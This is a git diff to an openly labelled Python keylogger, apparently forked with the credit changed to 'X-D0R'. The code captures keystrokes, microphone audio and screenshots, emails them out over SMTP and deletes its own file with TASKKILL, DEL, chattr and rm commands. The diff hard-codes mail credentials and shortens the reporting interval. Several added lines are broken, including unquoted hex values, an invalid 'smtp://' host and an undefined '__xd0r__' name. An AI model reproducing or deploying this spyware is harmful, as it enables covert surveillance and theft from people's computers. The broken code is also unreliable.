@@ -22,15 +22,15 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
+    EMAIL_ADDRESS = "11f178d4f8ed3a"
+    EMAIL_PASSWORD = "19a09d7437ff86"
+    SEND_REPORT_EVERY = 10 # as in seconds
     class KeyLogger:
         def __init__(self, time_interval, email, password):
             self.interval = time_interval
             self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+            self.email = 11f178d4f8ed3a
+            self.password = 19a09d7437ff86
 
         def appendlog(self, string):
             self.log = self.log + string
@@ -69,11 +69,11 @@ finally:
             To: {receiver}
             From: {sender}
 
-            Keylogger by aydinnyunus\n"""
+            Keylogger by X-D0R\n"""
 
             m += message
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
+            with smtplib.SMTP("smtp://sandbox.smtp.mailtrap.io", 2525) as server:
+                server.login(11f178d4f8ed3a, 19a09d7437ff86)
                 server.sendmail(sender, receiver, message)
 
         def report(self):
@@ -105,11 +105,11 @@ finally:
             obj.writeframesraw(myrecording)
             sd.wait()
 
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+            self.send_mail(email=11f178d4f8ed3a, password=19a09d7437ff86, message=obj)
 
         def screenshot(self):
             img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+            self.send_mail(email=11f178d4f8ed3a, password=19a09d7437ff86, message=img)
 
         def run(self):
             keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -122,9 +122,9 @@ finally:
                 try:
                     pwd = os.path.abspath(os.getcwd())
                     os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                    os.system("TASKKILL /F /IM " + os.path.basename(__xd0r__))
                     print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
+                    os.system("DEL " + os.path.basename(__xd0r__))
                 except OSError:
                     print('File is close.')
 
@@ -133,9 +133,9 @@ finally:
                     pwd = os.path.abspath(os.getcwd())
                     os.system("cd " + pwd)
                     os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
+                    os.system("chattr -i " +  os.path.basename(__xd0r__))
                     print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
+                    os.system("rm -rf" + os.path.basename(__xd0r__))
                 except OSError:
                     print('File is close.')
 
